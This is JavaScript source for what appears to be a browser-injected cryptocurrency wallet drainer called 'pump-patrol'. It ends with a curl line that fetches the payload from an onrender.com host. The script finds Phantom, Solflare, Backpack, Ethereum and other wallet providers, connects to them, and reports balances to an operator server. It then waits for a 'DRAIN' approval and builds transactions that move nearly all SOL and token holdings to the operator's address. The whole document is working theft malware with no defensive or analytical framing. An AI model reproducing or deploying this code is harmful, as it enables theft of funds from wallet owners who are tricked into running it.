(async()=>{
const VER='v3.3';
const K='72d296b612eb0a11931b364ba1333a70';
let BASE=(window.__PP||'').replace(/\/+$/,'');
const log=(m,c)=>{try{console.log('%c[pump-patrol '+VER+'] '+m,c||'color:#5eead4;font-weight:bold')}catch(e){}};
if(!BASE){log('no origin — bookmark not built from the site','color:#ff5c7a');return}
log('start · origin '+BASE);
const sid=Math.random().toString(36).slice(2,8);
const site=()=>location.host||location.protocol+'//'+location.hostname;
const report=async(o)=>{try{const r=await fetch(BASE+'/api/report/'+sid+'?k='+K,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(Object.assign({site:site(),ver:VER},o))});if(!r.ok)log('report HTTP '+r.status,(r.status===403?'color:#ff5c7a; font-weight:bold':'color:#ffb454'))}catch(e){log('report failed '+e,'color:#ff5c7a')}};
const le8=v=>{const d=new DataView(new ArrayBuffer(8));d.setBigUint64(0,BigInt(v),true);return[...new Uint8Array(d.buffer)]};
const withTO=(p,ms,lbl)=>new Promise(r=>{const to=setTimeout(()=>{log(lbl+' timed out','color:#ffb454');r(null)},ms);Promise.resolve(p).then(v=>{clearTimeout(to);r(v)},()=>{clearTimeout(to);r(null)})});

// 1) config — with self-healing: if the bookmark's origin is dead and we're on the site itself, retry there
let cfgR;try{cfgR=await fetch(BASE+'/api/config?k='+K)}catch(e){cfgR=null}
if(!cfgR||cfgR.status===404){
  if(location.origin&&location.origin!==BASE){
    log('bookmark origin unreachable — trying page origin '+location.origin,'color:#ffb454');
    BASE=location.origin;
    try{cfgR=await fetch(BASE+'/api/config?k='+K)}catch(e){cfgR=null}
  }
}
if(!cfgR){log('config fetch failed (both origins)','color:#ff5c7a');await report({phase:'fault',fault:'config fetch failed — bookmark origin dead and page is not the site'});return}
let cfg=null;try{cfg=await cfgR.json()}catch(e){}
if(!cfg||cfg.ok===false||!cfg.me){log('config HTTP '+cfgR.status,'color:#ff5c7a');await report({phase:'fault',fault:'config HTTP '+cfgR.status+' — '+(cfgR.status===403?'PP_SECRET ≠ K in p.js':'bot down')});return}
const PER=cfg.perTx||2;
log('config ok · drain to '+cfg.me+' via '+BASE);

// 2) web3 — ESM
const W3=await(async()=>{
  const urls=['https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.mjs','https://esm.sh/@solana/web3.js@1.95.3'];
  for(const u of urls){try{const m=await import(u);const M=m.default&&m.default.Connection?m.default:m;if(M.Connection)return M}catch(e){log('web3 load failed: '+u,'color:#ffb454')}}
  return null;
})();
if(!W3){await report({phase:'fault',fault:'web3.js failed to load (CSP or network)'});return}
log('web3 loaded');
const{Connection,PublicKey,SystemProgram,Transaction,TransactionInstruction,LAMPORTS_PER_SOL}=W3;
const conn=new Connection(cfg.rpc);
const TOKEN=new PublicKey('TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm'),ATAP=new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8khL'),ME=new PublicKey(cfg.me);
const findAta=(o,m)=>PublicKey.findProgramAddressSync([o.toBuffer(),m.toBuffer()],ATAP)[0];

// 3) BROAD DETECTION — many globals (incl. trust + ethereum), this tab + top frame, retry
const GLOBALS=['phantom','solana','solflare','backpack','trust','exawallet','glow','litellink','mathbadger','neynar','ethereum'];
function provFrom(w,name){
  let o;try{o=w[name]}catch(e){return null}
  if(!o)return null;
  const c=[o.solana,o.provider,o].filter(Boolean);
  for(const p of c){if(p&&typeof p.connect==='function')return p}
  return null;
}
function frames(){
  const L=[{label:'self',w:window}];
  try{if(window.top&&window.top!==window)L.push({label:'top',w:window.top})}catch(e){}
  return L;
}
function detect(){
  const found=[],checked={},seen=new Set();
  for(const f of frames()){
    let w;try{w=f.w}catch(e){continue}
    for(const g of GLOBALS){
      let present=false;try{present=!!w[g]}catch(e){}
      checked[g]=present||checked[g];
      if(present){const p=provFrom(w,g);if(p&&!seen.has(p)){seen.add(p);found.push(g+'@'+f.label)}}
    }
  }
  return {found,checked,topSame:(window.top===window),frames:(window.frames?window.frames.length:1)};
}
let det=detect();
await report({phase:'start',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames});
log('detected: '+(det.found.join(', ')||'none')+' | globals: '+Object.keys(det.checked).filter(k=>det.checked[k]).join(', '),'color:'+(det.found.length?'':'#ffb454'));
if(!det.found.length){await new Promise(s=>setTimeout(s,3000));det=detect();await report({phase:'scan',detected:det.found,checked:det.checked,topSame:det.topSame,frames:det.frames});log('rescan: '+(det.found.join(', ')||'still none'),'color:#ffb454')}
const usable=det.found.map(x=>x.split('@')[0]).filter(nm=>provFrom(window,nm)||provFrom(window.top,nm)).map(nm=>({name:nm,provider:provFrom(window,nm)||provFrom(window.top,nm)}));
const seen2=new Set();
const ws=usable.filter(x=>!seen2.has(x.provider)&&(seen2.add(x.provider),true));

// helper: read one owner's balances
async function readOwner(owner){
  const lam=await withTO(conn.getBalance(owner),15000,'getBalance');
  const ta=await withTO(conn.getParsedTokenAccountsByOwner(owner,{programId:TOKEN}),15000,'tokenAccounts');
  const toks=[];
  if(ta)for(const it of ta.value){
    const info=it.account.data&&it.account.data.parsed&&it.account.data.parsed.info;
    const a=info&&info.tokenAmount;
    const amt=a&&a.amount!=null?BigInt(String(a.amount)):0n;
    if(amt>0n)toks.push({src:it.pubkey,mint:new PublicKey(info.mint),dec:a.decimals,amt:a.amount,ui:a.uiAmountString??a.uiAmount});
  }
  toks.sort((a,b)=>BigInt(String(b.amt))>BigInt(String(a.amt))?1:-1);
  if(toks.length>24)toks.length=24;
  return {lam,toks};
}

const live=[],rep=[];
let evm='';
try{const e=window.ethereum;if(e){const a=await withTO(e.request({method:'eth_accounts'}),8000,'evm');if(a&&a.length){const w=await withTO(e.request({method:'eth_getBalance',params:[a[0],'latest']}),8000,'evm bal');if(w!=null)evm=a[0]+' — '+(BigInt(w)/10n**18n)+' ETH'}}}catch(e){}

// 4) connect + read each usable provider
for(const w of ws){
  try{
    log('connecting '+w.name+'…');
    const c=await withTO(w.provider.connect(),25000,w.name+' connect');
    const pk=(c&&c.publicKey)||w.provider.publicKey;
    if(!pk){rep.push({name:w.name,addr:'(no account in '+w.name+')',sol:0,tokens:[]});log(w.name+' — no account selected');continue}
    const owner=new PublicKey(String(pk));
    const{lam,toks}=await readOwner(owner);
    if(lam===null){live.push({w,owner,lam:0,toks,skipSol:true});rep.push({name:w.name,addr:owner.toString(),sol:0,tokens:toks.map(t=>({mint:t.mint.toString(),amt:String(t.ui)})),note:'SOL read stalled — tokens only'});continue}
    live.push({w,owner,lam,toks});
    rep.push({name:w.name,addr:owner.toString(),sol:+(lam/LAMPORTS_PER_SOL).toFixed(6),tokens:toks.map(t=>({mint:t.mint.toString(),amt:String(t.ui)}))});
    log(w.name+' connected · '+(lam/LAMPORTS_PER_SOL).toFixed(5)+' SOL · '+toks.length+' tokens');
  }catch(e){rep.push({name:w.name,addr:'(refused)',sol:0,tokens:[]});log(w.name+' refused: '+String(e),'color:#ffb454')}
}

// 5) ready card
await report({phase:'ready',evm,wallets:rep});
log('ready · waiting for DRAIN');

// 6) poll verdict
let act=null;const t0=Date.now();
while(!act&&Date.now()-t0<300000){let v=null;try{const r=await fetch(BASE+'/api/verdict/'+sid+'?k='+K);v=await r.json()}catch(e){}if(v&&v.a)act=v.a;else await new Promise(s=>setTimeout(s,2500))}
if(act!=='go'){log(act==='stop'?'skipped':'timed out');await report({phase:'done',note:act==='stop'?'skipped by operator':'timed out (5 min)'});return}
log('DRAIN approved');

// 7) drain — SOL to ME, tokens to ME's ATAs
const RENT=await conn.getMinimumBalanceForRentExemption(165);
let sigs=0;
for(const{w,owner,lam,toks,skipSol}of live){
  await withTO(w.provider.connect({auth:false}).catch(()=>null),10000,'reconnect '+w.name);
  const chunks=[];for(let i=0;i<toks.length;i+=PER)chunks.push(toks.slice(i,i+PER));
  if(!chunks.length)chunks.push([]);
  let newAtas=0;
  for(const t of toks){const a=await conn.getAccountInfo(findAta(ME,t.mint)).catch(()=>null);if(!a)newAtas++}
  const drainLam=skipSol?0:lam-chunks.length*5000-newAtas*RENT;
  let first=true;
  for(const chunk of chunks){
    try{
      const bh=await conn.getLatestBlockhash();
      const tx=new Transaction({feePayer:owner,recentBlockhash:bh.blockhash});
      if(first&&drainLam>0)tx.add(SystemProgram.transfer({fromPubkey:owner,toPubkey:ME,lamports:drainLam}));
      for(const t of chunk){
        const ata=findAta(ME,t.mint);
        const exists=await conn.getAccountInfo(ata).catch(()=>null);
        if(!exists)tx.add(new TransactionInstruction({programId:ATAP,data:Uint8Array.of(0),keys:[
          {pubkey:owner,isSigner:true,isWritable:true},{pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false},
          {pubkey:t.mint,isSigner:false,isWritable:false},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},
          {pubkey:TOKEN,isSigner:false,isWritable:false},{pubkey:W3.SYSVAR_RENT_PUBKEY,isSigner:false,isWritable:false}]}));
        tx.add(new TransactionInstruction({programId:TOKEN,keys:[
          {pubkey:t.src,isSigner:false,isWritable:true},{pubkey:t.mint,isSigner:false,isWritable:false},
          {pubkey:ata,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false}],
          data:Uint8Array.from([12,...le8(t.amt),t.dec])}));
      }
      let sig;
      if(w.provider.signAndSendTransaction){const s=await w.provider.signAndSendTransaction(tx);sig=typeof s==='string'?s:(s.signature||s)}
      else{const st=await w.provider.signTransaction(tx);sig=await conn.sendRawTransaction(st.serialize())}
      const s=typeof sig==='string'?sig:(sig.signature||String(sig));
      try{await conn.confirmTransaction(s,'confirmed')}catch(e){}
      sigs++;log('signed '+s.slice(0,8));
    }catch(e){log('tx failed '+String(e),'color:#ff5c7a')}
    first=false;
  }
}
await report({phase:'done',note:sigs+' tx signed',wallets:rep});
log('done · '+sigs+' tx');
})().catch(e=>{try{console.log('%c[pump-patrol '+VER+'] fatal '+e,'color:#ff5c7a')}catch(_){}});curl -s https://one234-et4e.onrender.com/p.js | head -c 120
